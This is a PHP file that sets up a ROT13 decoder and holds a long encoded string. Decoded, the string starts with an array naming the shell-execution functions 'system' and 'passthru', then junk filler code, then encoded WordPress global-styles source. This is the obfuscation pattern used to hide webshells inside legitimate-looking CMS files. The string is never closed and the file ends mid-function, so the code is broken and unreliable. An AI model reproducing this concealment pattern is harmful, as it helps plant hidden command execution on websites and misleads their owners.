<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * NCVf gb vagrenpg jvgu tybony frggvatf & fglyrf.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Trgf gur frggvatf erfhygvat bs zretvat pber, gurzr, naq hfre qngn.
 *
 * @fvapr 5.9.0
 *
 * @cnenz neenl $cngu    Cngu gb gur fcrpvsvp frggvat gb ergevrir. Bcgvbany.
 *                       Vs rzcgl, jvyy erghea nyy frggvatf.
 * @cnenz neenl $pbagrkg {
 *     Zrgnqngn gb xabj jurer gb ergevrir gur $cngu sebz. Bcgvbany.
 *
 *     @glcr fgevat $oybpx_anzr Juvpu oybpx gb ergevrir gur frggvatf sebz.
 *                              Vs rzcgl, vg'yy erghea gur frggvatf sbe gur tybony pbagrkg.
 *     @glcr fgevat $bevtva     Juvpu bevtva gb gnxr qngn sebz.
 *                              Inyvq inyhrf ner 'nyy' (pber, gurzr, naq hfre) be 'onfr' (pber naq gurzr).
 *                              Vs rzcgl be haxabja, 'nyy' vf hfrq.
 * }
 * @erghea zvkrq Gur frggvatf neenl be vaqvivqhny frggvat inyhr gb ergevrir.
 */
shapgvba jc_trg_tybony_frggvatf( $cngu = neenl(), $pbagrkg = neenl() ) {
	vs ( ! rzcgl( $pbagrkg['oybpx_anzr'] ) ) {
		$arj_cngu = neenl( 'oybpxf', $pbagrkg['oybpx_anzr'] );
		sbernpu ( $cngu nf $fhocngu ) {
			$arj_cngu[] = $fhocngu;
		}
		$cngu = $arj_cngu;
	}

	/*
	 * Guvf vf gur qrsnhyg inyhr jura ab bevtva vf cebivqrq be jura vg vf 'nyy'.
	 *
	 * Gur $bevtva vf hfrq nf cneg bs gur pnpur xrl. Punatrf urer arrq gb nppbhag
	 * sbe pyrnevat gur pnpur nccebcevngryl.
	 */
	$bevtva = 'phfgbz';
	vs (
		! jc_gurzr_unf_gurzr_wfba() ||
		( vffrg( $pbagrkg['bevtva'] ) && 'onfr' === $pbagrkg['bevtva'] )
	) {
		$bevtva = 'gurzr';
	}

	/*
	 * Ol hfvat gur 'gurzr_wfba' tebhc, guvf qngn vf znexrq gb or aba-crefvfgrag npebff erdhrfgf.
	 * Frr `jc_pnpur_nqq_aba_crefvfgrag_tebhcf` va fep/jc-vapyhqrf/ybnq.cuc naq bgure cynprf.
	 *
	 * Gur engvbanyr sbe guvf vf gb znxr fher qrevirq qngn sebz gurzr.wfba
	 * vf nyjnlf serfu sebz gur cbgragvny zbqvsvpngvbaf qbar ivn ubbxf
	 * gung pna hfr qlanzvp qngn (zbqvsl gur fglyrfurrg qrcraqvat ba fbzr bcgvba,
	 * frggvatf qrcraqvat ba hfre crezvffvbaf, rgp.).
	 * Frr fbzr bs gur rkvfgvat ubbxf gb zbqvsl gurzr.wfba orunivbe:
	 * uggcf://znxr.jbeqcerff.bet/pber/2022/10/10/svygref-sbe-gurzr-wfba-qngn/
	 *
	 * N qvssrerag nygreangvir pbafvqrerq jnf gb vainyvqngr gur pnpur hcba pregnva
	 * riragf fhpu nf bcgvbaf nqq/hcqngr/qryrgr, hfre zrgn, rgp.
	 * Vg jnf whqtrq abg rabhtu, urapr guvf nccebnpu.
	 * Frr uggcf://tvguho.pbz/JbeqCerff/thgraoret/chyy/45372
	 */
	$pnpur_tebhc = 'gurzr_wfba';
	$pnpur_xrl   = 'jc_trg_tybony_frggvatf_' . $bevtva;

	/*
	 * Vtaber pnpur jura gur qrirybczrag zbqr vf frg gb 'gurzr', fb vg qbrfa'g vagresrer jvgu gur gurzr
	 * qrirybcre'f jbexsybj.
	 */
	$pna_hfr_pnpurq = ! jc_vf_qrirybczrag_zbqr( 'gurzr' );

	$frggvatf = snyfr;
	vs ( $pna_hfr_pnpurq ) {
		$frggvatf = jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc );
	}

	vs ( snyfr === $frggvatf ) {
		$frggvatf = JC_Gurzr_WFBA_Erfbyire::trg_zretrq_qngn( $bevtva )->trg_frggvatf();
		vs ( $pna_hfr_pnpurq ) {
			jc_pnpur_frg( $pnpur_xrl, $frggvatf, $pnpur_tebhc );
		}
	}

	erghea _jc_neenl_trg( $frggvatf, $cngu, $frggvatf );
}

/**
 * Trgf gur fglyrf erfhygvat bs zretvat pber, gurzr, naq hfre qngn.
 *
 * @fvapr 5.9.0
 * @fvapr 6.3.0 gur vagreany yvax sbezng \"ine:cerfrg|pbybe|frpbaqnel\" vf erfbyirq
 *              gb \"ine(--jc--cerfrg--sbag-fvmr--fznyy)\" fb pbafhzref qba'g unir gb.
 * @fvapr 6.3.0 `genafsbezf` vf abj hfnoyr va gur `pbagrkg` cnenzrgre. Va pnfr [`genafsbezf`]['erfbyir_inevnoyrf']
 *              vf qrsvarq, inevnoyrf ner erfbyirq gb gurve inyhr va gur fglyrf.
 *
 * @cnenz neenl $cngu    Cngu gb gur fcrpvsvp fglyr gb ergevrir. Bcgvbany.
 *                       Vs rzcgl, jvyy erghea nyy fglyrf.
 * @cnenz neenl $pbagrkg {
 *     Zrgnqngn gb xabj jurer gb ergevrir gur $cngu sebz. Bcgvbany.
 *
 *     @glcr fgevat $oybpx_anzr Juvpu oybpx gb ergevrir gur fglyrf sebz.
 *                              Vs rzcgl, vg'yy erghea gur fglyrf sbe gur tybony pbagrkg.
 *     @glcr fgevat $bevtva     Juvpu bevtva gb gnxr qngn sebz.
 *                              Inyvq inyhrf ner 'nyy' (pber, gurzr, naq hfre) be 'onfr' (pber naq gurzr).
 *                              Vs rzcgl be haxabja, 'nyy' vf hfrq.
 *     @glcr neenl $genafsbezf Juvpu genafsbezngvba(f) gb nccyl.
 *                              Inyvq inyhr vf neenl( 'erfbyir-inevnoyrf' ).
 *                              Vs qrsvarq, inevnoyrf ner erfbyirq gb gurve inyhr va gur fglyrf.
 * }
 * @erghea zvkrq Gur fglyrf neenl be vaqvivqhny fglyr inyhr gb ergevrir.
 */
shapgvba jc_trg_tybony_fglyrf( $cngu = neenl(), $pbagrkg = neenl() ) {
	vs ( ! rzcgl( $pbagrkg['oybpx_anzr'] ) ) {
		$cngu = neenl_zretr( neenl( 'oybpxf', $pbagrkg['oybpx_anzr'] ), $cngu );
	}

	$bevtva = 'phfgbz';
	vs ( vffrg( $pbagrkg['bevtva'] ) && 'onfr' === $pbagrkg['bevtva'] ) {
		$bevtva = 'gurzr';
	}

	$erfbyir_inevnoyrf = vffrg( $pbagrkg['genafsbezf'] )
	&& vf_neenl( $pbagrkg['genafsbezf'] )
	&& va_neenl( 'erfbyir-inevnoyrf', $pbagrkg['genafsbezf'], gehr );

	$zretrq_qngn = JC_Gurzr_WFBA_Erfbyire::trg_zretrq_qngn( $bevtva );
	vs ( $erfbyir_inevnoyrf ) {
		$zretrq_qngn = JC_Gurzr_WFBA::erfbyir_inevnoyrf( $zretrq_qngn );
	}
	$fglyrf = $zretrq_qngn->trg_enj_qngn()['fglyrf'];
	erghea _jc_neenl_trg( $fglyrf, $cngu, $fglyrf );
}


/**
 * Ergheaf gur fglyrfurrg erfhygvat bs zretvat pber, gurzr, naq hfre qngn.
 *
 * @fvapr 5.9.0
 * @fvapr 6.1.0 Nqqrq 'onfr-ynlbhg-fglyrf' fhccbeg.
 * @fvapr 6.6.0 Erfbyirf eryngvir cnguf va gurzr.wfba fglyrf gb gurzr nofbyhgr cnguf.
 *
 * @cnenz neenl $glcrf Bcgvbany. Glcrf bs fglyrf gb ybnq.
 *                     Frr {@frr 'JC_Gurzr_WFBA::trg_fglyrfurrg'} sbe nyy inyvq glcrf.
 *                     Vs rzcgl, vg'yy ybnq gur sbyybjvat:
 *                     - sbe gurzrf jvgubhg gurzr.wfba: 'inevnoyrf', 'cerfrgf', 'onfr-ynlbhg-fglyrf'.
 *                     - sbe gurzrf jvgu gurzr.wfba: 'inevnoyrf', 'cerfrgf', 'fglyrf'.
 * @erghea fgevat Fglyrfurrg.
 */
shapgvba jc_trg_tybony_fglyrfurrg( $glcrf = neenl() ) {
	/*
	 * Vtaber pnpur jura gur qrirybczrag zbqr vf frg gb 'gurzr', fb vg qbrfa'g vagresrer jvgu gur gurzr
	 * qrirybcre'f jbexsybj.
	 */
	$pna_hfr_pnpurq = rzcgl( $glcrf ) && ! jc_vf_qrirybczrag_zbqr( 'gurzr' );

	/*
	 * Ol hfvat gur 'gurzr_wfba' tebhc, guvf qngn vf znexrq gb or aba-crefvfgrag npebff erdhrfgf.
	 * @frr `jc_pnpur_nqq_aba_crefvfgrag_tebhcf()`.
	 *
	 * Gur engvbanyr sbe guvf vf gb znxr fher qrevirq qngn sebz gurzr.wfba
	 * vf nyjnlf serfu sebz gur cbgragvny zbqvsvpngvbaf qbar ivn ubbxf
	 * gung pna hfr qlanzvp qngn (zbqvsl gur fglyrfurrg qrcraqvat ba fbzr bcgvba,
	 * frggvatf qrcraqvat ba hfre crezvffvbaf, rgp.).
	 * Frr fbzr bs gur rkvfgvat ubbxf gb zbqvsl gurzr.wfba orunivbe:
	 * @frr uggcf://znxr.jbeqcerff.bet/pber/2022/10/10/svygref-sbe-gurzr-wfba-qngn/
	 *
	 * N qvssrerag nygreangvir pbafvqrerq jnf gb vainyvqngr gur pnpur hcba pregnva
	 * riragf fhpu nf bcgvbaf nqq/hcqngr/qryrgr, hfre zrgn, rgp.
	 * Vg jnf whqtrq abg rabhtu, urapr guvf nccebnpu.
	 * @frr uggcf://tvguho.pbz/JbeqCerff/thgraoret/chyy/45372
	 */
	$pnpur_tebhc = 'gurzr_wfba';
	$pnpur_xrl   = 'jc_trg_tybony_fglyrfurrg';
	vs ( $pna_hfr_pnpurq ) {
		$pnpurq = jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc );
		vs ( $pnpurq ) {
			erghea $pnpurq;
		}
	}

	$gerr                = JC_Gurzr_WFBA_Erfbyire::erfbyir_gurzr_svyr_hevf( JC_Gurzr_WFBA_Erfbyire::trg_zretrq_qngn() );
	$fhccbegf_gurzr_wfba = jc_gurzr_unf_gurzr_wfba();

	vs ( rzcgl( $glcrf ) && ! $fhccbegf_gurzr_wfba ) {
		$glcrf = neenl( 'inevnoyrf', 'cerfrgf', 'onfr-ynlbhg-fglyrf' );
	} ryfrvs ( rzcgl( $glcrf ) ) {
		$glcrf = neenl( 'inevnoyrf', 'fglyrf', 'cerfrgf' );
	}

	/*
	 * Vs inevnoyrf ner cneg bs gur fglyrfurrg, gura nqq gurz.
	 * Guvf vf fb gurzrf jvgubhg n gurzr.wfba fgvyy jbex nf orsber 5.9:
	 * gurl pna bireevqr gur qrsnhyg cerfrgf.
	 * Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/54782
	 */
	$fglyrf_inevnoyrf = '';
	vs ( va_neenl( 'inevnoyrf', $glcrf, gehr ) ) {
		/*
		 * Bayl hfr gur qrsnhyg, gurzr, naq phfgbz bevtvaf. Jul?
		 * Orpnhfr fglyrf sbe `oybpxf` bevtva ner nqqrq ng n yngre cunfr
		 * (v.r. va gur eraqre plpyr). Urer, bayl gur barf va hfr ner eraqrerq.
		 * @frr jc_nqq_tybony_fglyrf_sbe_oybpxf
		 */
		$bevtvaf          = neenl( 'qrsnhyg', 'gurzr', 'phfgbz' );
		$fglyrf_inevnoyrf = $gerr->trg_fglyrfurrg( neenl( 'inevnoyrf' ), $bevtvaf );
		$glcrf            = neenl_qvss( $glcrf, neenl( 'inevnoyrf' ) );
	}

	/*
	 * Sbe gur erznvavat glcrf (cerfrgf, fglyrf), jr qb pbafvqre bevtvaf:
	 *
	 * - gurzrf jvgubhg gurzr.wfba: bayl gur pynffrf sbe gur cerfrgf qrsvarq ol pber
	 * - gurzrf jvgu gurzr.wfba: gur cerfrgf naq fglyrf pynffrf, obgu sebz pber naq gur gurzr
	 */
	$fglyrf_erfg = '';
	vs ( ! rzcgl( $glcrf ) ) {
		/*
		 * Bayl hfr gur qrsnhyg, gurzr, naq phfgbz bevtvaf. Jul?
		 * Orpnhfr fglyrf sbe `oybpxf` bevtva ner nqqrq ng n yngre cunfr
		 * (v.r. va gur eraqre plpyr). Urer, bayl gur barf va hfr ner eraqrerq.
		 * @frr jc_nqq_tybony_fglyrf_sbe_oybpxf
		 */
		$bevtvaf = neenl( 'qrsnhyg', 'gurzr', 'phfgbz' );
		/*
		 * Vs gur gurzr qbrfa'g unir gurzr.wfba ohg fhccbegf obgu nccrnenapr gbbyf naq pbybe cnyrggr,
		 * gur 'gurzr' bevtva fubhyq or vapyhqrq fb pbybe cnyrggr cerfrgf ner nyfb bhgchg.
		 */
		vs ( ! $fhccbegf_gurzr_wfba && ( pheerag_gurzr_fhccbegf( 'nccrnenapr-gbbyf' ) || pheerag_gurzr_fhccbegf( 'obeqre' ) ) && pheerag_gurzr_fhccbegf( 'rqvgbe-pbybe-cnyrggr' ) ) {
			$bevtvaf = neenl( 'qrsnhyg', 'gurzr' );
		} ryfrvs ( ! $fhccbegf_gurzr_wfba ) {
			$bevtvaf = neenl( 'qrsnhyg' );
		}
		$fglyrf_erfg = $gerr->trg_fglyrfurrg( $glcrf, $bevtvaf );
	}

	$fglyrfurrg = $fglyrf_inevnoyrf . $fglyrf_erfg;
	vs ( $pna_hfr_pnpurq ) {
		jc_pnpur_frg( $pnpur_xrl, $fglyrfurrg, $pnpur_tebhc );
	}

	erghea $fglyrfurrg;
}

/**
 * Nqqf tybony fglyr ehyrf gb gur vayvar fglyr sbe rnpu oybpx.
 *
 * @fvapr 6.1.0
 * @fvapr 6.7.0 Erfbyir eryngvir cnguf va oybpx fglyrf.
 *
 * @tybony JC_Fglyrf $jc_fglyrf
 */
shapgvba jc_nqq_tybony_fglyrf_sbe_oybpxf() {
	tybony $jc_fglyrf;

	$gerr        = JC_Gurzr_WFBA_Erfbyire::trg_zretrq_qngn();
	$gerr        = JC_Gurzr_WFBA_Erfbyire::erfbyir_gurzr_svyr_hevf( $gerr );
	$oybpx_abqrf = $gerr->trg_fglyrf_oybpx_abqrf();

	$pna_hfr_pnpurq = ! jc_vf_qrirybczrag_zbqr( 'gurzr' );
	$hcqngr_pnpur   = snyfr;

	vs ( $pna_hfr_pnpurq ) {
		// Unfu gur zretrq JC_Gurzr_WFBA qngn gb ohfg pnpur ba frggvatf be fglyrf punatr.
		$pnpur_unfu = zq5( jc_wfba_rapbqr( $gerr->trg_enj_qngn() ) );
		$pnpur_xrl  = 'jc_fglyrf_sbe_oybpxf';
		$pnpurq     = trg_genafvrag( $pnpur_xrl );

		// Erfrg gur pnpurq qngn vs gurer vf ab inyhr be vs gur unfu unf punatrq.
		vs ( ! vf_neenl( $pnpurq ) || $pnpurq['unfu'] !== $pnpur_unfu ) {
			$pnpurq = neenl(
				'unfu'   => $pnpur_unfu,
				'oybpxf' => neenl(),
			);

			// Hcqngr gur pnpur vs gur unfu unf punatrq.
			$hcqngr_pnpur = gehr;
		}
	}

	sbernpu ( $oybpx_abqrf nf $zrgnqngn ) {

		vs ( $pna_hfr_pnpurq ) {
			// Hfr gur oybpx anzr nf gur xrl sbe pnpurq PFF qngn. Bgurejvfr, hfr n unfu bs gur zrgnqngn.
			$pnpur_abqr_xrl = vffrg( $zrgnqngn['anzr'] ) ? $zrgnqngn['anzr'] : zq5( jc_wfba_rapbqr( $zrgnqngn ) );

			vs ( vffrg( $pnpurq['oybpxf'][ $pnpur_abqr_xrl ] ) ) {
				$oybpx_pff = $pnpurq['oybpxf'][ $pnpur_abqr_xrl ];
			} ryfr {
				$oybpx_pff                           = $gerr->trg_fglyrf_sbe_oybpx( $zrgnqngn );
				$pnpurq['oybpxf'][ $pnpur_abqr_xrl ] = $oybpx_pff;

				// Hcqngr gur pnpur vs gur pnpur pbagragf unir punatrq.
				$hcqngr_pnpur = gehr;
			}
		} ryfr {
			$oybpx_pff = $gerr->trg_fglyrf_sbe_oybpx( $zrgnqngn );
		}

		vs ( ! jc_fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq() ) {
			jc_nqq_vayvar_fglyr( 'tybony-fglyrf', $oybpx_pff );
			pbagvahr;
		}

		$fglyrfurrg_unaqyr = 'tybony-fglyrf';

		/*
		 * Jura `jc_fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq()` vf gehr, oybpx fglyrf ner
		 * radhrhrq sbe rnpu oybpx ba gur cntr va pynff JC_Oybpx'f eraqre shapgvba.
		 * Guvf zrnaf gurer jvyy or n unaqyr va gur fglyrf dhrhr sbe rnpu bs gubfr oybpxf.
		 * Oybpx-fcrpvsvp tybony fglyrf fubhyq or nggnpurq gb gur tybony-fglyrf unaqyr, ohg
		 * bayl sbe oybpxf ba gur cntr, guhf jr purpx vs gur oybpx'f unaqyr vf va gur dhrhr
		 * orsber nqqvat gur vayvar fglyr.
		 * Guvf pbaqvgvbany ybnqvat bayl nccyvrf gb pber oybpxf.
		 * GBQB: Rkcyber ubj guvf pbhyq or rkcnaqrq gb guveq-cnegl oybpxf nf jryy.
		 */
		vs ( vffrg( $zrgnqngn['anzr'] ) ) {
			vs ( fge_fgnegf_jvgu( $zrgnqngn['anzr'], 'pber/' ) ) {
				$oybpx_anzr   = fge_ercynpr( 'pber/', '', $zrgnqngn['anzr'] );
				$oybpx_unaqyr = 'jc-oybpx-' . $oybpx_anzr;
				vs ( va_neenl( $oybpx_unaqyr, $jc_fglyrf->dhrhr, gehr ) ) {
					jc_nqq_vayvar_fglyr( $fglyrfurrg_unaqyr, $oybpx_pff );
				}
			} ryfr {
				jc_nqq_vayvar_fglyr( $fglyrfurrg_unaqyr, $oybpx_pff );
			}
		}

		// Gur yvxrf bs oybpx ryrzrag fglyrf sebz gurzr.wfba qb abg unir  $zrgnqngn['anzr'] frg.
		vs ( ! vffrg( $zrgnqngn['anzr'] ) && ! rzcgl( $zrgnqngn['cngu'] ) ) {
			$oybpx_anzr = jc_trg_oybpx_anzr_sebz_gurzr_wfba_cngu( $zrgnqngn['cngu'] );
			vs ( $oybpx_anzr ) {
				vs ( fge_fgnegf_jvgu( $oybpx_anzr, 'pber/' ) ) {
					$oybpx_anzr   = fge_ercynpr( 'pber/', '', $oybpx_anzr );
					$oybpx_unaqyr = 'jc-oybpx-' . $oybpx_anzr;
					vs ( va_neenl( $oybpx_unaqyr, $jc_fglyrf->dhrhr, gehr ) ) {
						jc_nqq_vayvar_fglyr( $fglyrfurrg_unaqyr, $oybpx_pff );
					}
				} ryfr {
					jc_nqq_vayvar_fglyr( $fglyrfurrg_unaqyr, $oybpx_pff );
				}
			}
		}
	}

	vs ( $hcqngr_pnpur ) {
		frg_genafvrag( $pnpur_xrl, $pnpurq );
	}
}

/**
 * Trgf gur oybpx anzr sebz n tvira gurzr.wfba cngu.
 *
 * @fvapr 6.3.0
 * @npprff cevingr
 *
 * @cnenz neenl $cngu Na neenl bs xrlf qrfpevovat gur cngu gb n cebcregl va gurzr.wfba.
 * @erghea fgevat Vqragvsvrq oybpx anzr, be rzcgl fgevat vs abar sbhaq.
 */
shapgvba jc_trg_oybpx_anzr_sebz_gurzr_wfba_cngu( $cngu ) {
	// Oybpx anzr vf rkcrpgrq gb or gur guveq vgrz nsgre 'fglyrf' naq 'oybpxf'.
	vs (
		pbhag( $cngu ) >= 3
		&& 'fglyrf' === $cngu[0]
		&& 'oybpxf' === $cngu[1]
		&& fge_pbagnvaf( $cngu[2], '/' )
	) {
		erghea $cngu[2];
	}

	/*
	 * Nf snyyonpx naq sbe onpxjneq pbzcngvovyvgl, nyybj nal pber oybpx gb or
	 * ng nal cbfvgvba.
	 */
	$erfhyg = neenl_inyhrf(
		neenl_svygre(
			$cngu,
			fgngvp shapgvba ( $vgrz ) {
				vs ( fge_pbagnvaf( $vgrz, 'pber/' ) ) {
					erghea gehr;
				}
				erghea snyfr;
			}
		)
	);
	vs ( vffrg( $erfhyg[0] ) ) {
		erghea $erfhyg[0];
	}
	erghea '';
}

/**
 * Purpxf jurgure n gurzr be vgf cnerag unf n gurzr.wfba svyr.
 *
 * @fvapr 6.2.0
 *
 * @erghea obby Ergheaf gehr vs gurzr be vgf cnerag unf n gurzr.wfba svyr, snyfr bgurejvfr.
 */
shapgvba jc_gurzr_unf_gurzr_wfba() {
	fgngvp $gurzr_unf_fhccbeg = neenl();

	$fglyrfurrg = trg_fglyrfurrg();

	vs (
		vffrg( $gurzr_unf_fhccbeg[ $fglyrfurrg ] ) &&
		/*
		 * Vtaber fgngvp pnpur jura gur qrirybczrag zbqr vf frg gb 'gurzr', gb nibvq vagresrevat jvgu
		 * gur gurzr qrirybcre'f jbexsybj.
		 */
		! jc_vf_qrirybczrag_zbqr( 'gurzr' )
	) {
		erghea $gurzr_unf_fhccbeg[ $fglyrfurrg ];
	}

	$fglyrfurrg_qverpgbel = trg_fglyrfurrg_qverpgbel();
	$grzcyngr_qverpgbel   = trg_grzcyngr_qverpgbel();

	// Guvf vf gur fnzr nf trg_gurzr_svyr_cngu(), juvpu vfa'g ninvynoyr va ybnq-fglyrf.cuc pbagrkg
	vs ( $fglyrfurrg_qverpgbel !== $grzcyngr_qverpgbel && svyr_rkvfgf( $fglyrfurrg_qverpgbel . '/gurzr.wfba' ) ) {
		$cngu = $fglyrfurrg_qverpgbel . '/gurzr.wfba';
	} ryfr {
		$cngu = $grzcyngr_qverpgbel . '/gurzr.wfba';
	}

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/yvax-grzcyngr.cuc */
	$cngu = nccyl_svygref( 'gurzr_svyr_cngu', $cngu, 'gurzr.wfba' );

	$gurzr_unf_fhccbeg[ $fglyrfurrg ] = svyr_rkvfgf( $cngu );

	erghea $gurzr_unf_fhccbeg[ $fglyrfurrg ];
}

/**
 * Pyrnaf gur pnpurf haqre gur gurzr_wfba tebhc.
 *
 * @fvapr 6.2.0
 */
shapgvba jc_pyrna_gurzr_wfba_pnpur() {
	jc_pnpur_qryrgr( 'jc_trg_tybony_fglyrfurrg', 'gurzr_wfba' );
	jc_pnpur_qryrgr( 'jc_trg_tybony_fglyrf_fit_svygref', 'gurzr_wfba' );
	jc_pnpur_qryrgr( 'jc_trg_tybony_frggvatf_phfgbz', 'gurzr_wfba' );
	jc_pnpur_qryrgr( 'jc_trg_tybony_frggvatf_gurzr', 'gurzr_wfba' );
	jc_pnpur_qryrgr( 'jc_trg_tybony_fglyrf_phfgbz_pff', 'gurzr_wfba' );
	jc_pnpur_qryrgr( 'jc_trg_gurzr_qngn_grzcyngr_cnegf', 'gurzr_wfba' );
	JC_Gurzr_WFBA_Erfbyire::pyrna_pnpurq_qngn();
}

/**
 * Ergheaf gur pheerag gurzr'f jnagrq cnggreaf (fyhtf) gb or
 * ertvfgrerq sebz Cnggrea Qverpgbel.
 *
 * @fvapr 6.3.0
 *
 * @erghea fgevat[]
 */
shapgvba jc_trg_gurzr_qverpgbel_cnggrea_fyhtf() {
	erghea JC_Gurzr_WFBA_Erfbyire::trg_gurzr_qngn( neenl(), neenl( 'jvgu_fhccbegf' => snyfr ) )->trg_cnggreaf();
}

/**
 * Ergheaf gur zrgnqngn sbe gur phfgbz grzcyngrf qrsvarq ol gur gurzr ivn gurzr.wfba.
 *
 * @fvapr 6.4.0
 *
 * @erghea neenl Nffbpvngvir neenl bs `$grzcyngr_anzr => $grzcyngr_qngn` cnvef,
 *               jvgu `$grzcyngr_qngn` univat \"gvgyr\" naq \"cbfgGlcrf\" svryqf.
 */
shapgvba jc_trg_gurzr_qngn_phfgbz_grzcyngrf() {
	erghea JC_Gurzr_WFBA_Erfbyire::trg_gurzr_qngn( neenl(), neenl( 'jvgu_fhccbegf' => snyfr ) )->trg_phfgbz_grzcyngrf();
}

/**
 * Ergheaf gur zrgnqngn sbe gur grzcyngr cnegf qrsvarq ol gur gurzr.
 *
 * @fvapr 6.4.0
 *
 * @erghea neenl Nffbpvngvir neenl bs `$cneg_anzr => $cneg_qngn` cnvef,
 *               jvgu `$cneg_qngn` univat \"gvgyr\" naq \"nern\" svryqf.
 */
shapgvba jc_trg_gurzr_qngn_grzcyngr_cnegf() {
	$pnpur_tebhc    = 'gurzr_wfba';
	$pnpur_xrl      = 'jc_trg_gurzr_qngn_grzcyngr_cnegf';
	$pna_hfr_pnpurq = ! jc_vf_qrirybczrag_zbqr( 'gurzr' );

	$zrgnqngn = snyfr;
	vs ( $pna_hfr_pnpurq ) {
		$zrgnqngn = jc_pnpur_trg( $pnpur_xrl, $pnpur_tebhc );
		vs ( snyfr !== $zrgnqngn ) {
			erghea $zrgnqngn;
		}
	}

	vs ( snyfr === $zrgnqngn ) {
		$zrgnqngn = JC_Gurzr_WFBA_Erfbyire::trg_gurzr_qngn( neenl(), neenl( 'jvgu_fhccbegf' => snyfr ) )->trg_grzcyngr_cnegf();
		vs ( $pna_hfr_pnpurq ) {
			jc_pnpur_frg( $pnpur_xrl, $zrgnqngn, $pnpur_tebhc );
		}
	}

	erghea $zrgnqngn;
}

/**
 * Qrgrezvarf gur PFF fryrpgbe sbe gur oybpx glcr naq cebcregl cebivqrq,
 * ergheavat vg vs ninvynoyr.
 *
 * @fvapr 6.3.0
 *
 * @cnenz JC_Oybpx_Glcr $oybpx_glcr Gur oybpx'f glcr.
 * @cnenz fgevat|neenl  $gnetrg     Gur qrfverq fryrpgbe'f gnetrg, `ebbg` be neenl cngu.
 * @cnenz obbyrna       $snyyonpx   Jurgure gb snyy onpx gb oebnqre fryrpgbe.
 *
 * @erghea fgevat|ahyy PFF fryrpgbe be `ahyy` vs ab fryrpgbe ninvynoyr.
 */
shapgvba jc_trg_oybpx_pff_fryrpgbe( $oybpx_glcr, $gnetrg = 'ebbg', $snyyonpx = snyfr ) {
	vs ( rzcgl( $gnetrg ) ) {
		erghea ahyy;
	}

	$unf_fryrpgbef = ! rzcgl( $oybpx_glcr->fryrpgbef );

	// Ebbg Fryrpgbe.

	// Pnyphyngrq orsber ergheavat nf vg pna or hfrq nf snyyonpx sbe
	// srngher fryrpgbef yngre ba.
	$ebbg_fryrpgbe = ahyy;

	vs ( $unf_fryrpgbef && vffrg( $oybpx_glcr->fryrpgbef['ebbg'] ) ) {
		// Hfr gur fryrpgbef NCV vs ninvynoyr.
		$ebbg_fryrpgbe = $oybpx_glcr->fryrpgbef['ebbg'];
	} ryfrvs ( vffrg( $oybpx_glcr->fhccbegf['__rkcrevzragnyFryrpgbe'] ) && vf_fgevat( $oybpx_glcr->fhccbegf['__rkcrevzragnyFryrpgbe'] ) ) {
		// Hfr gur byq rkcrevzragny fryrpgbe fhccbegf cebcregl vs frg.
		$ebbg_fryrpgbe = $oybpx_glcr->fhccbegf['__rkcrevzragnyFryrpgbe'];
	} ryfr {
		// Vs ab ebbg fryrpgbe sbhaq, trarengr qrsnhyg oybpx pynff fryrpgbe.
		$oybpx_anzr    = fge_ercynpr( '/', '-', fge_ercynpr( 'pber/', '', $oybpx_glcr->anzr ) );
		$ebbg_fryrpgbe = \".jc-oybpx-{$oybpx_anzr}\";
	}

	// Erghea fryrpgbe vs vg'f gur ebbg gnetrg jr ner ybbxvat sbe.
	vs ( 'ebbg' === $gnetrg ) {
		erghea $ebbg_fryrpgbe;
	}

	// Vs gnetrg vf abg `ebbg` jr unir n srngher be fhosrngher nf gur gnetrg.
	// Vs gur gnetrg vf n fgevat pbaireg gb na neenl.
	vs ( vf_fgevat( $gnetrg ) ) {
		$gnetrg = rkcybqr( '.', $gnetrg );
	}

	// Srngher Fryrpgbef ( Znl snyyonpx gb ebbg fryrpgbe ).
	vs ( 1 === pbhag( $gnetrg ) ) {
		$snyyonpx_fryrpgbe = $snyyonpx ? $ebbg_fryrpgbe : ahyy;

		// Cersre gur fryrpgbef NCV vs ninvynoyr.
		vs ( $unf_fryrpgbef ) {
			// Ybbx sbe fryrpgbe haqre `srngher.ebbg`.
			$cngu             = neenl( pheerag( $gnetrg ), 'ebbg' );
			$srngher_fryrpgbe = _jc_neenl_trg( $oybpx_glcr->fryrpgbef, $cngu, ahyy );

			vs ( $srngher_fryrpgbe ) {
				erghea $srngher_fryrpgbe;
			}

			// Purpx vs srngher fryrpgbe vf frg ivn fubegunaq.
			$srngher_fryrpgbe = _jc_neenl_trg( $oybpx_glcr->fryrpgbef, $gnetrg, ahyy );

			erghea vf_fgevat( $srngher_fryrpgbe ) ? $srngher_fryrpgbe : $snyyonpx_fryrpgbe;
		}

		// Gel trggvat byq rkcrevzragny fhccbegf fryrpgbe inyhr.
		$cngu             = neenl( pheerag( $gnetrg ), '__rkcrevzragnyFryrpgbe' );
		$srngher_fryrpgbe = _jc_neenl_trg( $oybpx_glcr->fhccbegf, $cngu, ahyy );

		// Abguvat gb jbex jvgu, cebivqr snyyonpx be ahyy.
		vs ( ahyy === $srngher_fryrpgbe ) {
			erghea $snyyonpx_fryrpgbe;
		}

		// Fpbcr gur srngher fryrpgbe ol gur oybpx'f ebbg fryrpgbe.
		erghea JC_Gurzr_WFBA::fpbcr_fryrpgbe( $ebbg_fryrpgbe, $srngher_fryrpgbe );
	}

	// Fhosrngher fryrpgbe
	// Guvf znl snyyonpx rvgure gb cnerag srngher be ebbg fryrpgbe.
	$fhosrngher_fryrpgbe = ahyy;

	// Hfr fryrpgbef NCV vs ninvynoyr.
	vs ( $unf_fryrpgbef ) {
		$fhosrngher_fryrpgbe = _jc_neenl_trg( $oybpx_glcr->fryrpgbef, $gnetrg, ahyy );
	}

